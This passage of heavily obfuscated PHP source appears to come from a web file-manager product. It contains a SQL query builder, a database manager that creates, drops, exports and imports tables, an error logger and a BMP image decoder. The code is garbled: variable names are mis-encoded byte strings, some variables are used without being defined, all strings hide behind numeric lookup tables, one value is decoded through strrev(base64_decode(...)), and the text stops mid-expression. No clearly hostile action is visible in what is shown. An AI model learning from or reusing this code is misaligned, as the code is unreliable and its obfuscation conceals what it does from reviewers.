$DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[277]] : $Aõ»£Î¡Ï[33]) . $this->parseLock(isset($DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[770]]) ? $DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[770]] : !1) . $this->parseComment(!empty($DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[338]]) ? $DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[338]] : $Aõ»£Î¡Ï[33]); return $this->execute($Cñ²àŠƒó, $this->parseBind(!empty($DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[270]]) ? $DÀŞŞÈ¿ø[$Aõ»£Î¡Ï[270]] : array())); } public function select($aŒ¦Éøƒ ö = array()) { goto FÜí«ƒ§âí; A®Ìä’„¤÷: $fâÅäø Şø = isset($aŒ¦Éøƒ ö[$b¦øï‡Ÿçé[334]]) ? $aŒ¦Éøƒ ö[$b¦øï‡Ÿçé[334]] : !1; if ($fâÅäø Şø) { $dêñ¨ï¡§ì = is_string($fâÅäø Şø[$b¦øï‡Ÿçé[89]]) ? $fâÅäø Şø[$b¦øï‡Ÿçé[89]] : $b¦øï‡Ÿçé[954] . md5($D¹¹¼ãù˜); $e±Å°ˆ™ö = think_cache($dêñ¨ï¡§ì, $b¦øï‡Ÿçé[33], $fâÅäø Şø); if (!1 !== $e±Å°ˆ™ö) { return $e±Å°ˆ™ö; } } $DØå ìœÆõ = $this->query($D¹¹¼ãù˜, $this->parseBind(!empty($aŒ¦Éøƒ ö[$b¦øï‡Ÿçé[270]]) ? $aŒ¦Éøƒ ö[$b¦øï‡Ÿçé[270]] : array())); goto aäƒ½­¼©‰; FÜí«ƒ§âí: $b¦øï‡Ÿçé =& $_SERVER[¢à]; $this->model = $aŒ¦Éøƒ ö[$b¦øï‡Ÿçé[266]]; $D¹¹¼ãù˜ = $this->buildSelectSql($aŒ¦Éøƒ ö); goto A®Ìä’„¤÷; aäƒ½­¼©‰: if ($fâÅäø Şø && !1 !== $DØå ìœÆõ) { think_cache($dêñ¨ï¡§ì, $DØå ìœÆõ, $fâÅäø Şø); } return $DØå ìœÆõ; goto a¾¯î¼ÀÇ‰; a¾¯î¼ÀÇ‰: } public function buildSelectSql($B¢ßÁ†êÖÎ = array()) { goto BéùÈÁÆ’²; BéùÈÁÆ’²: $bÙÄêŸ¾Éç =& $_SERVER[¢à]; if (isset($B¢ßÁ†êÖÎ[$bÙÄêŸ¾Éç[337]])) { if (strpos($B¢ßÁ†êÖÎ[$bÙÄêŸ¾Éç[337]], $bÙÄêŸ¾Éç[47])) { list($Aä¼ß‚ñ¨ö, $dĞÒËß§•ô) = explode($bÙÄêŸ¾Éç[47], $B¢ßÁ†êÖÎ[$bÙÄêŸ¾Éç[337]]); } else { $Aä¼ß‚ñ¨ö = $B¢ßÁ†êÖÎ[$bÙÄêŸ¾Éç[337]]; } $Aä¼ß‚ñ¨ö = $Aä¼ß‚ñ¨ö ? $Aä¼ß‚ñ¨ö : 1; $dĞÒËß§•ô = isset($dĞÒËß§•ô) ? $dĞÒËß§•ô : (is_numeric($B¢ßÁ†êÖÎ[$bÙÄêŸ¾Éç[277]]) ? $B¢ßÁ†êÖÎ[$bÙÄêŸ¾Éç[277]] : 20); $aâˆŸìø­‹ = $dĞÒËß§•ô * ((int) $Aä¼ß‚ñ¨ö - 1); $B¢ßÁ†êÖÎ[$bÙÄêŸ¾Éç[277]] = $aâˆŸìø­‹ . $bÙÄêŸ¾Éç[47] . $dĞÒËß§•ô; } if (think_config($bÙÄêŸ¾Éç[955])) { $f¼ñî„Ñğ£ = $bÙÄêŸ¾Éç[956] . md5(serialize($B¢ßÁ†êÖÎ)); $fÊ´¯âëßé = think_cache($f¼ñî„Ñğ£); if ($fÊ´¯âëßé) { return $fÊ´¯âëßé; } } goto E¶ë½é¢óÒ; E¶ë½é¢óÒ: $BŠˆğïÕÅ = $this->parseSql($this->selectSql, $B¢ßÁ†êÖÎ); $BŠˆğïÕÅ .= $this->parseLock(isset($B¢ßÁ†êÖÎ[$bÙÄêŸ¾Éç[770]]) ? $B¢ßÁ†êÖÎ[$bÙÄêŸ¾Éç[770]] : !1); if (isset($f¼ñî„Ñğ£)) { think_cache($f¼ñî„Ñğ£, $BŠˆğïÕÅ); } goto EªÛÍ”Û„; EªÛÍ”Û„: return $BŠˆğïÕÅ; goto Fç±“ÆÇÏ; Fç±“ÆÇÏ: } public function parseSql($C¯¼’“Œ‘É, $D‰æ¸éç»î = array()) { $CÉØå©Şè„ =& $_SERVER[¢à]; $C¯¼’“Œ‘É = str_replace(array($CÉØå©Şè„[957], $CÉØå©Şè„[958], $CÉØå©Şè„[959], $CÉØå©Şè„[960], $CÉØå©Şè„[961], $CÉØå©Şè„[962], $CÉØå©Şè„[963], $CÉØå©Şè„[964], $CÉØå©Şè„[965], $CÉØå©Şè„[966], $CÉØå©Şè„[967]), array($this->parseTable("{$D‰æ¸éç»î[$CÉØå©Şè„[264]]}"), $this->parseDistinct(isset($D‰æ¸éç»î[$CÉØå©Şè„[968]]) ? $D‰æ¸éç»î[$CÉØå©Şè„[968]] : !1), $this->parseField(!empty($D‰æ¸éç»î[$CÉØå©Şè„[258]]) ? $D‰æ¸éç»î[$CÉØå©Şè„[258]] : $CÉØå©Şè„[173]), $this->parseJoin(!empty($D‰æ¸éç»î[$CÉØå©Şè„[267]]) ? $D‰æ¸éç»î[$CÉØå©Şè„[267]] : $CÉØå©Şè„[33]), $this->parseWhere(!empty($D‰æ¸éç»î[$CÉØå©Şè„[260]]) ? $D‰æ¸éç»î[$CÉØå©Şè„[260]] : $CÉØå©Şè„[33]), $this->parseGroup(!empty($D‰æ¸éç»î[$CÉØå©Şè„[969]]) ? $D‰æ¸éç»î[$CÉØå©Şè„[969]] : $CÉØå©Şè„[33]), $this->parseHaving(!empty($D‰æ¸éç»î[$CÉØå©Şè„[970]]) ? $D‰æ¸éç»î[$CÉØå©Şè„[970]] : $CÉØå©Şè„[33]), $this->parseOrder(!empty($D‰æ¸éç»î[$CÉØå©Şè„[347]]) ? $D‰æ¸éç»î[$CÉØå©Şè„[347]] : $CÉØå©Şè„[33]), $this->parseLimit(!empty($D‰æ¸éç»î[$CÉØå©Şè„[277]]) ? $D‰æ¸éç»î[$CÉØå©Şè„[277]] : $CÉØå©Şè„[33]), $this->parseUnion(!empty($D‰æ¸éç»î[$CÉØå©Şè„[332]]) ? $D‰æ¸éç»î[$CÉØå©Şè„[332]] : $CÉØå©Şè„[33]), $this->parseComment(!empty($D‰æ¸éç»î[$CÉØå©Şè„[338]]) ? $D‰æ¸éç»î[$CÉØå©Şè„[338]] : $CÉØå©Şè„[33])), $C¯¼’“Œ‘É); return $C¯¼’“Œ‘É; } public function getLastSql($c¶×ŒÚîò¿ = '') { return $c¶×ŒÚîò¿ ? $this->modelSql[$c¶×ŒÚîò¿] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($e£…Î Äá) { return addslashes($e£…Î Äá); } public function setModel($B—±àà„°±) { $this->model = $B—±àà„°±; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($BªóÊß÷Ç¥, $d‰âöÅäòã = '') { $this->database = $BªóÊß÷Ç¥; $this->type = $d‰âöÅäòã; } public function model($ešõ½´ˆË = '') { return new ModelBase($ešõ½´ˆË, $_SERVER[¢à][33], $this->database); } public function db($DÖµË¸ñ¤ = false) { goto b«áºğ·ñ; BµÜŞËÉê: $this->database = $EÁ©µñÕ‰«; $aÄ¬Ë°“ù = $this->model()->db(); $c¬ï”ÀÚê„ = $aÄ¬Ë°“ù->execute("\x73\x68\x6f\167\40\x64\141\164\141\x62\141\163\x65\x73\40\154\151\153\x65\40\x27{$cŒÚ…Ç¯Ì}\x27"); goto døÌƒ‘“­; aìªë­ÁÁ•: $cŒÚ…Ç¯Ì = $EÁ©µñÕ‰«[$A‘†à“‰›[231]]; $EÁ©µñÕ‰«[$A‘†à“‰›[231]] = $A‘†à“‰›[33]; if ($EÁ©µñÕ‰«[$A‘†à“‰›[886]] == $A‘†à“‰›[724]) { $aï˜Ô¾â¿Å = $EÁ©µñÕ‰«[$A‘†à“‰›[885]]; $EÁ©µñÕ‰«[$A‘†à“‰›[885]] = substr($aï˜Ô¾â¿Å, 0, strrpos($aï˜Ô¾â¿Å, $A‘†à“‰›[971])); } goto BµÜŞËÉê; døÌƒ‘“­: if (!$c¬ï”ÀÚê„) { $aÄ¬Ë°“ù->execute("\x63\x72\145\141\x74\x65\x20\x64\141\x74\141\x62\141\x73\145\x20\x60{$cŒÚ…Ç¯Ì}\140"); } $EÁ©µñÕ‰«[$A‘†à“‰›[231]] = $cŒÚ…Ç¯Ì; if ($EÁ©µñÕ‰«[$A‘†à“‰›[886]] == $A‘†à“‰›[724]) { $EÁ©µñÕ‰«[$A‘†à“‰›[885]] .= $A‘†à“‰›[971] . $cŒÚ…Ç¯Ì; } goto a„É„ùå›; a„É„ùå›: $this->database = $EÁ©µñÕ‰«; $aÄ¬Ë°“ù->execute("\165\x73\x65\x20\140{$cŒÚ…Ç¯Ì}\140"); return $aÄ¬Ë°“ù; goto A“ÆóÙÕù ; b«áºğ·ñ: $A‘†à“‰› =& $_SERVER[¢à]; $EÁ©µñÕ‰« = $this->database; if ($this->type == $A‘†à“‰›[9] || !$DÖµË¸ñ¤) { return $this->model()->db(); } goto aìªë­ÁÁ•; A“ÆóÙÕù : } public function createTable($Cå­Û—ÒÄ·, $dÔ‹½æ«í = null) { $dò„‘›¯ºŒ =& $_SERVER[¢à]; if (!IO::exist($Cå­Û—ÒÄ·)) { show_json(LNG($dò„‘›¯ºŒ[972]), !1); } $FÑàªˆ‰Í = sqlSplit(IO::getContent($Cå­Û—ÒÄ·)); foreach ($FÑàªˆ‰Í as $Fæè•ÀÌˆ) { if ($dÔ‹½æ«í) { $AöùÕ¶ƒ²Ö = stripos($Fæè•ÀÌˆ, $dò„‘›¯ºŒ[973]) === 0; if ($AöùÕ¶ƒ²Ö) { $dÔ‹½æ«í->task[$dò„‘›¯ºŒ[974]] += 1; } } $this->model()->db()->execute($Fæè•ÀÌˆ); if ($dÔ‹½æ«í && $AöùÕ¶ƒ²Ö) { $FËêÏó±äğ = $dò„‘›¯ºŒ[975]; preg_match($FËêÏó±äğ, $Fæè•ÀÌˆ, $CÁ‰Ú„ªİ); $dÔ‹½æ«í->task[$dò„‘›¯ºŒ[976]] = trim($Aöâé‹[0], $dò„‘›¯ºŒ[822]); $dÔ‹½æ«í->update(1); } } $this->taskToCache($dÔ‹½æ«í); } public function insertTable($E»¤ß£‰³, $cø¹¥ö‘“ = null) { $bÌ«÷Ô›Ü =& $_SERVER[¢à]; foreach ($E»¤ß£‰³ as $c¶¹êøŠœé) { $CÙ¥ß±É†¬ = basename($c¶¹êøŠœé); $CÙ¥ß±É†¬ = substr($CÙ¥ß±É†¬, 0, strrpos($CÙ¥ß±É†¬, $bÌ«÷Ô›Ü[93])); if ($cø¹¥ö‘“) { $cø¹¥ö‘“->task[$bÌ«÷Ô›Ü[976]] = $CÙ¥ß±É†¬; } if (get_filesize($c¶¹êøŠœé) == 0) { continue; } $Fîí—ÄÔÏ = $this->sqlToDb($c¶¹êøŠœé, $cø¹¥ö‘“); if (!$Fîí—ÄÔÏ) { show_json(LNG($bÌ«÷Ô›Ü[977]) . "\133{$CÙ¥ß±É†¬}\135", !1); } } $this->taskToCache($cø¹¥ö‘“); } public function sqlFromDb($bËˆ‘í›áö, $eÕ…‘¢ôÙ¼, $dµÇ„×¡‰è = null, $BùĞŠ™÷…« = null) { goto fõš°ßˆÃÖ; EÒØ«ÊĞŠ­: $E’ºí¤Úß = $cß­¿®éš->getPk(); $dä¨Ø“˜ò = $cß­¿®éš->getDbFields(); do { $d‰°¤ºº·¡ = $cß­¿®éš->field($dä¨Ø“˜ò)->order($E’ºí¤Úß . $_SERVER[¢à][979])->selectPage($Aùœ§´ó‡, $f¶ƒ·ÚÖæ’); $fÔ½»îåìç = !empty($d‰°¤ºº·¡[$_SERVER[¢à][351]]) ? $d‰°¤ºº·¡[$_SERVER[¢à][351]] : array(); if (!($AËŒë‰é¡ = count($fÔ½»îåìç))) { break; } if ($dµÇ„×¡‰è) { $dµÇ„×¡‰è->task[$_SERVER[¢à][974]] += $AËŒë‰é¡; } $Dí“Àò¦¥ = array(); foreach ($fÔ½»îåìç as $f¼áÍßçí) { if ($BùĞŠ™÷…«) { $f¼áÍßçí[$_SERVER[¢à][75]] = "\x7b\x69\157\72{$BùĞŠ™÷…«}\x7d" . substr($f¼áÍßçí[$_SERVER[¢à][75]], strlen("\173\x69\x6f\72{$f¼áÍßçí[$_SERVER[¢à][743]]}\175")); $f¼áÍßçí[$_SERVER[¢à][743]] = $BùĞŠ™÷…«; } $Dí“Àò¦¥[] = $_SERVER[¢à][980] . $this->sqlEncode($f¼áÍßçí) . $_SERVER[¢à][981]; } $eÖê†¶ÊÏ = "\111\x4e\123\105\122\x54\x20\111\116\124\x4f\40\140{$bËˆ‘í›áö}\140\x20\50\x60" . implode($_SERVER[¢à][982], $dä¨Ø“˜ò) . $_SERVER[¢à][983]; fwrite($AÇÂù‹í¦, $eÖê†¶ÊÏ . implode($_SERVER[¢à][984], $Dí“Àò¦¥) . $_SERVER[¢à][67] . PHP_EOL); $f¶ƒ·ÚÖæ’++; $eñ¬øàÚø += $AËŒë‰é¡; if ($dµÇ„×¡‰è) { $dµÇ„×¡‰è->update($AËŒë‰é¡); } } while ($AËŒë‰é¡ == $Aùœ§´ó‡); goto F·Óƒ¼¯¡¼; fõš°ßˆÃÖ: if ($dµÇ„×¡‰è) { $dµÇ„×¡‰è->task[$_SERVER[¢à][976]] = $bËˆ‘í›áö; } $cß­¿®éš = $this->model($bËˆ‘í›áö); $eñ¬øàÚø = 0; goto eŒÚ–®ØÓº; eŒÚ–®ØÓº: $f¶ƒ·ÚÖæ’ = 1; $Aùœ§´ó‡ = 500; $AÇÂù‹í¦ = fopen($eÕ…‘¢ôÙ¼, $_SERVER[¢à][978]); goto EÒØ«ÊĞŠ­; F·Óƒ¼¯¡¼: fclose($AÇÂù‹í¦); return $eñ¬øàÚø; goto bµ–¤ğ¿‰˜; bµ–¤ğ¿‰˜: } public function sqlToDb($aĞˆ†¥ÖÑ©, $eŒ—°ÎŞê = null) { goto E¡Ä©åğ; a‘Ü–® ‹Ğ: if ($Cšƒ¯…‘¨Ú) { $Cšƒ¯…‘¨Ú = rtrim(trim($Cšƒ¯…‘¨Ú), $aÑÏ–íß‹[67]); if (!$aÇ¯‹Â­ÑÃ->execute($Cšƒ¯…‘¨Ú)) { return !1; } if ($eŒ—°ÎŞê) { $eŒ—°ÎŞê->update($A´ìÙ·Í¢¶ - 1); } } return !0; goto F­«™çË‚¥; C‘Õçø©³á: if (!$f¼§ŒÀƒ–ó) { return !1; } $A´ìÙ·Í¢¶ = 0; $Cšƒ¯…‘¨Ú = $aÑÏ–íß‹[33]; goto eİ¶±Î¦Øé; eİ¶±Î¦Øé: $dŞ¢ˆŠ‚¢¡ = 500 + 1; while (!feof($f¼§ŒÀƒ–ó)) { if ($eŒ—°ÎŞê && $A´ìÙ·Í¢¶ != 0) { $eŒ—°ÎŞê->task[$aÑÏ–íß‹[974]] += 1; } $A´ìÙ·Í¢¶++; $dÌÜá¡Ü¾… = trim(fgets($f¼§ŒÀƒ–ó)); $Cšƒ¯…‘¨Ú .= $aÑÏ–íß‹[50] . $this->sqlDecode($dÌÜá¡Ü¾…, $this->type); if ($A´ìÙ·Í¢¶ == $dŞ¢ˆŠ‚¢¡) { $Cšƒ¯…‘¨Ú = rtrim(trim($Cšƒ¯…‘¨Ú), $aÑÏ–íß‹[67]); if (!$aÇ¯‹Â­ÑÃ->execute($Cšƒ¯…‘¨Ú)) { return !1; } if ($eŒ—°ÎŞê) { $eŒ—°ÎŞê->update($A´ìÙ·Í¢¶ - 1); } $Cšƒ¯…‘¨Ú = $aÑÏ–íß‹[33]; $A´ìÙ·Í¢¶ = 0; } } fclose($f¼§ŒÀƒ–ó); goto a‘Ü–® ‹Ğ; E¡Ä©åğ: $aÑÏ–íß‹ =& $_SERVER[¢à]; $aÇ¯‹Â­ÑÃ = $this->model()->db(); $f¼§ŒÀƒ–ó = @fopen($aĞˆ†¥ÖÑ©, $aÑÏ–íß‹[985]); goto C‘Õçø©³á; F­«™çË‚¥: } public function dropTable($F¼‹ï«¦‰Î = null) { $Dæ»Ğ¥æƒ = $this->model()->db(); $FŒÂà§Ğ = $F¼‹ï«¦‰Î ? array($F¼‹ï«¦‰Î) : $Dæ»Ğ¥æƒ->getTables(); if (!$FŒÂà§Ğ) { return; } foreach ($FŒÂà§Ğ as $F¼‹ï«¦‰Î) { $Dæ»Ğ¥æƒ->execute("\144\162\x6f\160\x20\x74\x61\x62\x6c\x65\40\151\x66\40\145\x78\151\163\164\x73\x20\140{$F¼‹ï«¦‰Î}\140"); } } private function taskToCache($c­³®•ËÈ = null) { $eÉòáŸº² =& $_SERVER[¢à]; if (!$c­³®•ËÈ) { return; } $Eä‚ò¹àÑÂ = array($eÉòáŸº²[976] => $c­³®•ËÈ->task[$eÉòáŸº²[976]], $eÉòáŸº²[974] => $c­³®•ËÈ->task[$eÉòáŸº²[974]], $eÉòáŸº²[986] => $c­³®•ËÈ->task[$eÉòáŸº²[986]]); if ($Eä‚ò¹àÑÂ[$eÉòáŸº²[974]] == $Eä‚ò¹àÑÂ[$eÉòáŸº²[986]]) { $Eä‚ò¹àÑÂ[$eÉòáŸº²[696]] = 1; } Cache::set($eÉòáŸº²[987] . $c­³®•ËÈ->task[$eÉòáŸº²[364]], $Eä‚ò¹àÑÂ); $c­³®•ËÈ->end(); } private function sqlEncode($E·Šñ¦ˆ¹š) { $Bæ·¼†Ğˆ™ =& $_SERVER[¢à]; $AİÆ¦µŒ†ª = array(); foreach ($E·Šñ¦ˆ¹š as $cº‰î†¤Ó¤) { if (is_array($cº‰î†¤Ó¤)) { $cº‰î†¤Ó¤ = json_encode_force($cº‰î†¤Ó¤); } $cº‰î†¤Ó¤ = addslashes($cº‰î†¤Ó¤); $cº‰î†¤Ó¤ = str_replace(array($Bæ·¼†Ğˆ™[988], $Bæ·¼†Ğˆ™[214]), array($Bæ·¼†Ğˆ™[989], $Bæ·¼†Ğˆ™[990]), $cº‰î†¤Ó¤); $AİÆ¦µŒ†ª[] = str_replace($Bæ·¼†Ğˆ™[55], $Bæ·¼†Ğˆ™[991], $cº‰î†¤Ó¤); } return $Bæ·¼†Ğˆ™[55] . implode($Bæ·¼†Ğˆ™[992], $AİÆ¦µŒ†ª) . $Bæ·¼†Ğˆ™[55]; } private function sqlDecode($D…ØøÈÜ¹­, $CºñéŠºì¥) { $CïÈ—ë©ÁÂ =& $_SERVER[¢à]; $D…ØøÈÜ¹­ = str_replace(array($CïÈ—ë©ÁÂ[989], $CïÈ—ë©ÁÂ[990]), array($CïÈ—ë©ÁÂ[988], $CïÈ—ë©ÁÂ[214]), $D…ØøÈÜ¹­); if ($CºñéŠºì¥ == $CïÈ—ë©ÁÂ[9]) { $D…ØøÈÜ¹­ = stripslashes($D…ØøÈÜ¹­); } return $D…ØøÈÜ¹­; } } goto d‡áäïô›; F©Ü¦Ú¸…: function beforeShutdownError($DÍ¥Ï³Ö¥… = false, $DäÑÙ×ÉÔ“ = '', $FÉ·âĞµ³ = '', $fÀ¾¸Å‘¼ = 0) { $a×äÌ½ÙŒÄ =& $_SERVER[‚¬û]; switch ($DÍ¥Ï³Ö¥…) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $DÕÌƒ•Ó‘± = $a×äÌ½ÙŒÄ[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $DÕÌƒ•Ó‘± = $a×äÌ½ÙŒÄ[40]; break; case E_STRICT: $DÕÌƒ•Ó‘± = $a×äÌ½ÙŒÄ[41]; break; case E_NOTICE: case E_USER_NOTICE: $DÕÌƒ•Ó‘± = $a×äÌ½ÙŒÄ[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $DÕÌƒ•Ó‘± = $a×äÌ½ÙŒÄ[43]; break; default: break; } if (!$DÕÌƒ•Ó‘± || $DÕÌƒ•Ó‘± == $a×äÌ½ÙŒÄ[42] || $DÕÌƒ•Ó‘± == $a×äÌ½ÙŒÄ[43]) { return; } $FÉ·âĞµ³ = $a×äÌ½ÙŒÄ[4] . str_replace($_SERVER[$a×äÌ½ÙŒÄ[37]], $a×äÌ½ÙŒÄ[20], $FÉ·âĞµ³); $b­‚ÇğèÌâ = $DÕÌƒ•Ó‘± . $a×äÌ½ÙŒÄ[44] . $DäÑÙ×ÉÔ“ . $a×äÌ½ÙŒÄ[44] . $FÉ·âĞµ³ . $a×äÌ½ÙŒÄ[44] . $fÀ¾¸Å‘¼; write_log($b­‚ÇğèÌâ . $a×äÌ½ÙŒÄ[18] . get_caller_msg(1), $a×äÌ½ÙŒÄ[19]); } $_SERVER[$_SERVER[‚¬û][45]] = $_SERVER[$_SERVER[‚¬û][37]] . $_SERVER[‚¬û][46]; $dÊª¡˜ÆõŞ = strrev(base64_decode($_SERVER[‚¬û][47])); goto CÀç©• §Ú; AóÍ¸ìãøÇ: class ImageGdBMP { public static function load($a†Ëˆ°Ë ò) { $E±İÎ«‹±‡ = fopen($a†Ëˆ°Ë ò, $_SERVER[¢à][1491]); if ($E±İÎ«‹±‡ === !1) { return !1; } $eƒÀ„ÅÀ¾ô = self::loadFromStream($E±İÎ«‹±‡); fclose($E±İÎ«‹±‡); return $eƒÀ„ÅÀ¾ô; } public static function loadFromStream($a‡İŠÛğœ) { $e•¨ùÛæÕ =& $_SERVER[¢à]; $b­‚‰»¡ŒÑ = fread($a‡İŠÛğœ, 14); if ($b­‚‰»¡ŒÑ === !1) { return !1; } if ($b­‚‰»¡ŒÑ[0] != $e•¨ùÛæÕ[1803] || $b­‚‰»¡ŒÑ[1] != $e•¨ùÛæÕ[1804]) { return !1; } $c†½é£¬‡ = unpack($e•¨ùÛæÕ[1805] . $e•¨ùÛæÕ[1806] . $e•¨ùÛæÕ[1807] . $e•¨ùÛæÕ[1808] . $e•¨ùÛæÕ[1809], $b­‚‰»¡ŒÑ); return self::loadFromStreamAndFileHeader($a‡İŠÛğœ, $c†½é£¬‡); } public static function loadFromStreamAndFileHeader($Eáğ—Å“õê, array $d‡¨·¼ó¶Ô) { goto d³Ò¢™è¤ù; E‘©ÜßÏå“: if ($F´ƒŒ¿Ş´ö == 0 || $c“ÈÊåèµ– == 0 || $c™¿ˆÑ¯’» != 1 || ($D´á ÷ªŠ– & $f»¨óĞÅŸ²) != 0 || ($D´á ÷ªŠ– & $aŞ£™äæ) != 0 || ($D´á ÷ªŠ– & $Aê›ŒÊŞ„ã) != 0 || ($f»¨óĞÅŸ² & $aŞ£™äæ) != 0 || ($f»¨óĞÅŸ² & $Aê›ŒÊŞ„ã) != 0 || ($aŞ£™äæ & $Aê›ŒÊŞ„ã) != 0) { return !1; } if ($AôøØÉ†ÛÄ == 4 || $AôøØÉ†ÛÄ == 5) { $Bï™ÈòÅõ = stream_get_contents($Eáğ—Å“õê, $EÏàÂ±«ö¹); if ($Bï™ÈòÅõ === !1) { return !1; } return imagecreatefromstring($Bï™ÈòÅõ); } $FŸìµà¯–Œ = $F´ƒŒ¿Ş´ö * $EÂ¼Ô£ÒÌµ + 31 >> 3 & ~3; goto dÛÂØœÛ; d¸‘‚–»«: if ($EÂ¼Ô£ÒÌµ == 1 || $EÂ¼Ô£ÒÌµ == 4 || $EÂ¼Ô£ÒÌµ == 8) { goto Aİİ²ÒõŸ; Aİİ²ÒõŸ: $a·â“í³« = imagecreate($F´ƒŒ¿Ş´ö, $AÍˆİ±å); $B­…®³ÔÙ = $B¼Á…æÈôÛ == 12 ? 3 : 4; $bè›ŒŸË­° = $EÈñèó›Š­ ? $EÈñèó›Š­ : pow(2, $EÂ¼Ô£ÒÌµ); goto A’„âé¡çâ; A’„âé¡çâ: $C’¥„àìé“ = array(); for ($f¤ÑÃÜöÇ = 0; $f¤ÑÃÜöÇ < $bè›ŒŸË­°; ++$f¤ÑÃÜöÇ) { $Bï™ÈòÅõ = fread($Eáğ—Å“õê, $B­…®³ÔÙ); if ($Bï™ÈòÅõ === !1) { imagedestroy($a·â“í³«); return !1; } extract(unpack($b»×Üƒ¶¢‘[1829], $Bï™ÈòÅõ . $b»×Üƒ¶¢‘[1828])); $C’¥„àìé“[] = imagecolorallocate($a·â“í³«, $F¥—»¢™Ú¸, $féğŒô´Œ¤, $a½‚×§ì¤); } $F¹ëÁ‹Ï¢Ñ = 8 - $EÂ¼Ô£ÒÌµ; goto D¶ËºŒ±óª; D¶ËºŒ±óª: $A«’—ïÜ—… = (1 << $EÂ¼Ô£ÒÌµ) - 1 << $F¹ëÁ‹Ï¢Ñ; if ($AôøØÉ†ÛÄ == 1 || $AôøØÉ†ÛÄ == 2) { $BÛ¡æ†ïÌØ = 0; $FùˆØÏØ¶¦ = $EÂ¼Ô£ÒÌµ >> 2 & 1; for (;;) { if ($BÛ¡æ†ïÌØ < -1 || $BÛ¡æ†ïÌØ > $F´ƒŒ¿Ş´ö || $eŒ¯õƒŠ¨ < -1 || $eŒ¯õƒŠ¨ > $c“ÈÊåèµ–) { imagedestroy($a·â“í³«); return !1; } $Bï™ÈòÅõ = fread($Eáğ—Å“õê, 1); if ($Bï™ÈòÅõ === !1) { imagedestroy($a·â“í³«); return !1; } switch ($Bï™ÈòÅõ) { case $b»×Üƒ¶¢‘[1828]: $Bï™ÈòÅõ = fread($Eáğ—Å“õê, 1); if ($Bï™ÈòÅõ === !1) { imagedestroy($a·â“í³«); return !1; } switch ($Bï™ÈòÅõ) { case $b»×Üƒ¶¢‘[1828]: $eŒ¯õƒŠ¨ += $B†Ü‹Ã¿•á; $BÛ¡æ†ïÌØ = 0; break; case $b»×Üƒ¶¢‘[1830]: $eŒ¯õƒŠ¨ = 0; $BÛ¡æ†ïÌØ = 0; break 3; case $b»×Üƒ¶¢‘[1831]: $Bï™ÈòÅõ = fread($Eáğ—Å“õê, 2); if ($Bï™ÈòÅõ === !1) { imagedestroy($a·â“í³«); return !1; } list(, $bÉæàùÚ¼Œ, $cˆêî×ë‚ê) = unpack($b»×Üƒ¶¢‘[1832], $Bï™ÈòÅõ); $BÛ¡æ†ïÌØ += $bÉæàùÚ¼Œ; $eŒ¯õƒŠ¨ += $cˆêî×ë‚ê * $B†Ü‹Ã¿•á; break; default: list(, $e¬ª´…Ç) = unpack($b»×Üƒ¶¢‘[1833], $Bï™ÈòÅõ); $BÚìÓ‡““² = ($e¬ª´…Ç >> $FùˆØÏØ¶¦) + ($e¬ª´…Ç & $FùˆØÏØ¶¦); $Bï™ÈòÅõ = fread($Eáğ—Å“õê, $BÚìÓ‡““² + 1 & ~1); if ($Bï™ÈòÅõ === !1) { imagedestroy($a·â“í³«); return !1; } for ($f¤ÑÃÜöÇ = 0, $f‚‹ïŠÊáï = 0; $f¤ÑÃÜöÇ < $e¬ª´…Ç; ++$f¤ÑÃÜöÇ, ++$BÛ¡æ†ïÌØ, $f‚‹ïŠÊáï += $EÂ¼Ô£ÒÌµ) { list(, $D½² àÕÁç) = unpack($b»×Üƒ¶¢‘[1833], $Bï™ÈòÅõ[$f‚‹ïŠÊáï >> 3]); $a½‚×§ì¤ = $f‚‹ïŠÊáï & 7; imagesetpixel($a·â“í³«, $BÛ¡æ†ïÌØ, $eŒ¯õƒŠ¨, $C’¥„àìé“[($D½² àÕÁç & $A«’—ïÜ—… >> $a½‚×§ì¤) >> $F¹ëÁ‹Ï¢Ñ - $a½‚×§ì¤]); } break; } break; default: $CöêØ¤‡Íë = fread($Eáğ—Å“õê, 1); if ($CöêØ¤‡Íë === !1) { imagedestroy($a·â“í³«); return !1; } list(, $A§æ±©ÓÆ‹, $D½² àÕÁç) = unpack($b»×Üƒ¶¢‘[1832], $Bï™ÈòÅõ . $CöêØ¤‡Íë); for ($f¤ÑÃÜöÇ = 0, $f‚‹ïŠÊáï = 0; $f¤ÑÃÜöÇ < $A§æ±©ÓÆ‹; ++$f¤ÑÃÜöÇ, ++$BÛ¡æ†ïÌØ, $f‚‹ïŠÊáï += $EÂ¼Ô£ÒÌµ) { $a½‚×§ì¤ = $f‚‹ïŠÊáï & 7; imagesetpixel($a·â“í³«, $BÛ¡æ†ïÌØ, $eŒ¯õƒŠ¨, $C’¥„àìé“[($D½² àÕÁç & $A«’—ïÜ—… >> $a½‚×§ì¤) >> $F¹ëÁ‹Ï¢Ñ - $a½‚×§ì¤]); } break; } } } else { for ($AùŸÓŞ¼„† = 0; $AùŸÓŞ¼„† < $AÍˆİ±å; ++$AùŸÓŞ¼„†, $eŒ¯õƒŠ¨ += $B†Ü‹Ã¿•á) { $Bï™ÈòÅõ = fread($Eáğ—Å“õê, $FŸìµà¯–Œ); if ($Bï™ÈòÅõ === !1) { imagedestroy($a·â“í³«); return !1; } $f‚‹ïŠÊáï = 0; for ($BÛ¡æ†ïÌØ = 0; $BÛ¡æ†ïÌØ < $F´ƒŒ¿Ş´ö; ++$BÛ¡æ†ïÌØ, $f‚‹ïŠÊáï += $EÂ¼Ô£ÒÌµ) { list(, $D½² àÕÁç) = unpack($b»×Üƒ¶¢‘[1833], $Bï™ÈòÅõ[$f‚‹ïŠÊáï >> 3]); $a½‚×§ì¤ = $f‚‹ïŠÊáï & 7; imagesetpixel($a·â“í³«, $BÛ¡æ†ïÌØ, $eŒ¯õƒŠ¨, $C’¥„àìé“[($D½² àÕÁç & 